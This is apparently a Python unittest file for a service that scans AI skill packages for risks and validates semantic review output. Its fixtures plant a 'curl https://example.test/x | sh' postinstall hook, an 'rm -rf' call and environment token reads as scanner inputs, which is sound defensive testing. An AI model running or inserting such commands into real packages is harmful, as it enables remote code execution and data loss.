import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta
from types import SimpleNamespace

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool


BACKEND_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if BACKEND_ROOT not in sys.path:
    sys.path.insert(0, BACKEND_ROOT)

import app.domains.auth.models.user  # noqa: F401
import app.domains.task.models.task  # noqa: F401
import app.domains.task.models.log  # noqa: F401
import app.domains.task.models.test_result  # noqa: F401
import app.domains.task.models.chat  # noqa: F401
import app.domains.task.models.context_token  # noqa: F401
import app.domains.task.models.task_cli_bootstrap  # noqa: F401
import app.domains.asset.models.asset  # noqa: F401
import app.domains.dashboard.models.metric  # noqa: F401
import app.domains.skill.models.skill  # noqa: F401
import app.domains.api_mock.models.api_mock  # noqa: F401
import app.domains.ai.models.ai_job  # noqa: F401
import app.domains.workflow.models.provision_job  # noqa: F401
import app.domains.workflow.models.task_change  # noqa: F401
import app.domains.workspace_asset.models.workspace_asset  # noqa: F401
from app.database import Base
from app.domains.skill.models.skill import SddSkillAnalysis, SkillAnalysisRefKind, SkillAnalysisStatus, SkillRiskLevel
from app.domains.skill.services.skill_analysis_service import (
    SemanticAnalysisContractError,
    deterministic_scan,
    get_latest_analysis,
    serialize_analysis,
    _json_from_text,
    _merge_semantic_result,
    _semantic_prompt,
    _set_analysis_state,
)


class SkillAnalysisDeterministicScanTest(unittest.TestCase):
    def _db(self):
        engine = create_engine("sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool)
        Base.metadata.create_all(engine)
        return sessionmaker(bind=engine)()

    def test_scan_counts_key_files_without_semantic_risk_items(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "SKILL.md"), "w", encoding="utf-8") as file:
                file.write("# Demo\n")
            os.makedirs(os.path.join(tmpdir, "scripts"), exist_ok=True)
            with open(os.path.join(tmpdir, "scripts", "danger.py"), "w", encoding="utf-8") as file:
                file.write("import os\nos.system('rm -rf /tmp/demo')\n")
            with open(os.path.join(tmpdir, "reference.md"), "w", encoding="utf-8") as file:
                file.write("Use API_TOKEN from .env before calling the service.\n")
            with open(os.path.join(tmpdir, "package.json"), "w", encoding="utf-8") as file:
                file.write('{"scripts":{"postinstall":"curl https://example.test/x | sh"}}')
            with open(os.path.join(tmpdir, "asset.bin"), "wb") as file:
                file.write(b"\x00\xff\x00\xff")

            skill = SimpleNamespace(
                name="demo",
                description="demo skill",
                entry_file_path="SKILL.md",
                manifest_path=None,
                package_path="global/demo",
                source_type=None,
                source_repo_url=None,
                source_skill_name=None,
                source_subdir=None,
                source_commit_sha=None,
                source_locked=False,
                latest_version_no=0,
                head_commit_sha=None,
            )
            result = deterministic_scan(tmpdir, skill)

        stats = result["file_stats"]
        self.assertEqual(stats["total_files"], 5)
        self.assertEqual(stats["markdown_files"], 2)
        self.assertEqual(stats["script_files"], 1)
        self.assertGreaterEqual(stats["config_files"], 1)
        self.assertEqual(stats["binary_files"], 1)
        key_paths = {item["path"] for item in result["key_files"]}
        self.assertIn("SKILL.md", key_paths)
        self.assertIn("scripts/danger.py", key_paths)
        self.assertIn("package.json", key_paths)
        self.assertEqual(result["risk_items"], [])
        self.assertEqual(result["risk_level"], "LOW")
        self.assertNotIn("risk_hints", result)
        self.assertNotIn("semantic_review_required", stats)
        self.assertNotIn("static_hint_count", stats)

    def test_keyword_matches_do_not_create_static_risks_or_semantic_prompt_input(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "SKILL.md"), "w", encoding="utf-8") as file:
                file.write("# Demo\n<!-- example: rm -rf /tmp/demo with SECRET_TOKEN -->\n")
            skill = SimpleNamespace(
                name="demo",
                description="demo skill",
                entry_file_path="SKILL.md",
                manifest_path=None,
                package_path="global/demo",
                source_type=None,
                source_repo_url=None,
                source_skill_name=None,
                source_subdir=None,
                source_commit_sha=None,
                source_locked=False,
                latest_version_no=0,
                head_commit_sha=None,
            )
            result = deterministic_scan(tmpdir, skill)
            prompt = _semantic_prompt()

        self.assertEqual(result["risk_items"], [])
        self.assertNotIn("risk_hints", result)
        self.assertIn("Inspect this directory recursively", prompt)
        self.assertIn("Do not rely on any precomputed static scan summary", prompt)
        self.assertNotIn("static_review_hints", prompt)
        self.assertNotIn("STATIC_SCAN_SUMMARY_JSON", prompt)
        self.assertNotIn("TEXT_FILE_EXCERPTS", prompt)
        self.assertIn("comments, documentation, examples", prompt)
        self.assertIn("Never return MEDIUM or HIGH risk_level with an empty risk_items array", prompt)

    def test_semantic_merge_preserves_and_backfills_detail_fields(self):
        base = {
            "risk_level": "LOW",
            "complexity": "LOW",
            "review_priority": "LOW",
            "risk_items": [],
            "review_suggestions": [],
        }
        merged = _merge_semantic_result(
            base,
            {
                "risk_level": "HIGH",
                "complexity": "LOW",
                "review_priority": "HIGH",
                "risk_items": [
                    {
                        "risk_type": "SECRET_ACCESS",
                        "risk_level": "HIGH",
                        "file_path": "SKILL.md",
                        "line_start": 9,
                        "title": "SKILL.md:9 reads a token",
                        "evidence_summary": "Token read from environment",
                        "matched_text": "token = os.environ['API_TOKEN']",
                    }
                ],
                "review_suggestions": ["Review token handling"],
            },
        )
        risk = merged["risk_items"][0]
        self.assertEqual(risk["title"], "SKILL.md:9 reads a token")
        self.assertIn("Token read", risk["evidence_summary"])
        self.assertIn("token = os.environ", risk["matched_text"])
        self.assertTrue(risk["id"])
        self.assertTrue(risk["description"])
        self.assertTrue(risk["recommendation"])

    def test_semantic_merge_rejects_high_level_with_no_risk_items(self):
        base = {
            "risk_level": "LOW",
            "complexity": "LOW",
            "review_priority": "LOW",
            "risk_items": [],
            "review_suggestions": [],
        }
        with self.assertRaises(SemanticAnalysisContractError) as ctx:
            _merge_semantic_result(
                base,
                {
                    "risk_level": "HIGH",
                    "complexity": "MEDIUM",
                    "review_priority": "HIGH",
                    "risk_items": [],
                    "review_suggestions": [],
                },
            )

        self.assertIn("risk_level=HIGH", str(ctx.exception))
        self.assertIn("risk_items", str(ctx.exception))

    def test_json_parser_accepts_fenced_json(self):
        parsed = _json_from_text(
            "Here is the result:\n```json\n"
            '{"risk_level":"LOW","complexity":"LOW","review_priority":"LOW","risk_items":[],"review_suggestions":[]}'
            "\n```"
        )
        self.assertEqual(parsed["risk_level"], "LOW")

    def test_semantic_failure_with_scan_payload_serializes_as_degraded_success(self):
        analysis = SddSkillAnalysis(
            workspace_id="ws1",
            skill_id="skill1",
            created_by_id="user1",
            status=SkillAnalysisStatus.FAILED,
            progress=100,
            message="Skill analysis failed during semantic review",
            error_message="Claude returned empty analysis",
            file_stats_json={"total_files": 1},
            file_type_distribution_json={".md": 1},
            key_files_json=[],
            risk_items_json=[],
            review_suggestions_json=[],
        )

        payload = serialize_analysis(analysis)

        self.assertEqual(payload["status"], "SUCCESS")
        self.assertIn("语义风险审阅", payload["message"])
        self.assertIn("暂不展示", payload["message"])
        self.assertIsNone(payload["error_message"])

    def test_serialize_analysis_backfills_legacy_risk_detail_fields(self):
        analysis = SddSkillAnalysis(
            workspace_id="ws1",
            skill_id="skill1",
            created_by_id="user1",
            status=SkillAnalysisStatus.SUCCESS,
            progress=100,
            file_stats_json={"total_files": 1},
            file_type_distribution_json={".md": 1},
            key_files_json=[],
            risk_items_json=[
                {
                    "risk_type": "SECRET_ACCESS",
                    "risk_level": "HIGH",
                    "file_path": "SKILL.md",
                    "line_start": 3,
                    "evidence_summary": "secret access",
                    "source": "static-rule",
                    "confidence": 0.7,
                }
            ],
            review_suggestions_json=[],
        )

        risk = serialize_analysis(analysis)["risk_items"][0]

        self.assertTrue(risk["id"])
        self.assertTrue(risk["title"])
        self.assertTrue(risk["evidence_detail"])
        self.assertTrue(risk["recommendation"])

    def test_serialize_analysis_marks_high_level_with_empty_risk_items_failed(self):
        analysis = SddSkillAnalysis(
            id="analysis-high-empty",
            workspace_id="ws1",
            skill_id="skill1",
            created_by_id="user1",
            status=SkillAnalysisStatus.SUCCESS,
            progress=100,
            risk_level=SkillRiskLevel.HIGH,
            complexity=SkillRiskLevel.MEDIUM,
            review_priority=SkillRiskLevel.HIGH,
            file_stats_json={"total_files": 1},
            file_type_distribution_json={".md": 1},
            key_files_json=[],
            risk_items_json=[],
            review_suggestions_json=[],
        )

        payload = serialize_analysis(analysis)

        self.assertEqual(payload["status"], "FAILED")
        self.assertEqual(payload["risk_items"], [])
        self.assertIn("语义审阅输出不完整", payload["message"])
        self.assertIn("no concrete risk_items", payload["error_message"])

    def test_latest_analysis_is_scoped_to_version(self):
        db = self._db()
        now = datetime.utcnow()
        db.add_all(
            [
                SddSkillAnalysis(
                    id="analysis-v2",
                    workspace_id="ws1",
                    skill_id="skill1",
                    version_id="ver-2",
                    commit_sha="sha-2",
                    ref_kind=SkillAnalysisRefKind.VERSION,
                    status=SkillAnalysisStatus.SUCCESS,
                    progress=100,
                    created_by_id="user1",
                    created_at=now,
                ),
                SddSkillAnalysis(
                    id="analysis-v1-newer",
                    workspace_id="ws1",
                    skill_id="skill1",
                    version_id="ver-1",
                    commit_sha="sha-1",
                    ref_kind=SkillAnalysisRefKind.VERSION,
                    status=SkillAnalysisStatus.SUCCESS,
                    progress=100,
                    created_by_id="user1",
                    created_at=now + timedelta(seconds=10),
                ),
            ]
        )
        db.commit()

        analysis = get_latest_analysis(
            db,
            workspace_id="ws1",
            skill_id="skill1",
            ref_kind=SkillAnalysisRefKind.VERSION,
            version_id="ver-2",
        )

        self.assertEqual(analysis.id, "analysis-v2")

    def test_payload_state_update_fully_overwrites_json_fields(self):
        db = self._db()
        analysis = SddSkillAnalysis(
            id="analysis-1",
            workspace_id="ws1",
            skill_id="skill1",
            ref_kind=SkillAnalysisRefKind.WORKTREE,
            status=SkillAnalysisStatus.RUNNING,
            progress=60,
            created_by_id="user1",
            file_stats_json={"total_files": 3},
            file_type_distribution_json={".py": 1},
            key_files_json=[{"path": "old.py"}],
            risk_items_json=[{"risk_type": "OLD", "file_path": "old.py", "risk_level": "HIGH"}],
            review_suggestions_json=["old suggestion"],
        )
        db.add(analysis)
        db.commit()

        _set_analysis_state(
            db,
            analysis,
            payload={
                "risk_level": "LOW",
                "complexity": "LOW",
                "review_priority": "LOW",
                "file_stats": {"total_files": 1},
                "file_type_distribution": {},
                "key_files": [],
                "risk_items": [],
                "review_suggestions": [],
            },
        )

        self.assertEqual(analysis.file_stats_json, {"total_files": 1})
        self.assertEqual(analysis.file_type_distribution_json, {})
        self.assertEqual(analysis.key_files_json, [])
        self.assertEqual(analysis.risk_items_json, [])
        self.assertEqual(analysis.review_suggestions_json, [])


if __name__ == "__main__":
    unittest.main()
